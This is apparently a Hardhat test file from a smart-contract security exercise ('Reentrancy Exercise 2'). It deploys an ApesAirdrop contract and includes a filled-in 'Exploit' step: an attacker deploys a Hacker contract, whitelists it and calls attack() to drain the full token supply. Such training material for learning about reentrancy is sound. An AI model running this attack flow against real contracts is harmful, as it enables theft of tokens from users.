const { ethers } = require('hardhat');
const { expect } = require('chai');
const { parseEther } = require("ethers/lib/utils");

describe('Reentrancy Exercise 2', function () {

    let deployer, user1, user2, user3, user4, attacker;
    let users;
    const TOTAL_SUPPLY = 50;

    before(async function () {
        /** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */

        [deployer, user1, user2, user3, user4, attacker] = await ethers.getSigners();
        users = [user1, user2, user3, user4, attacker];

        const ApesAirdropFactory = await ethers.getContractFactory(
            'contracts/reentrancy-2/ApesAirdrop.sol:ApesAirdrop',
            deployer
        );

        this.airdrop = await ApesAirdropFactory.deploy();

        await this.airdrop.addToWhitelist(users.map(user => user.address));

        for (let i = 0; i < users.length; i++) {
            expect(await this.airdrop.isWhitelisted(users[i].address)).to.equal(true);
        }

    });

    it('Exploit', async function () {
        /** CODE YOUR SOLUTION HERE */

        const hackerFactory = await ethers.getContractFactory(
            'contracts/reentrancy-2/Hacker.sol:Hacker',
            attacker
        );

        this.hacker = await hackerFactory.deploy(this.airdrop.address);

        await this.airdrop.connect(attacker).grantMyWhitelist(this.hacker.address);

        await this.hacker.attack();


    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        expect(await this.airdrop.balanceOf(attacker.address)).to.equal(TOTAL_SUPPLY);
    });
});
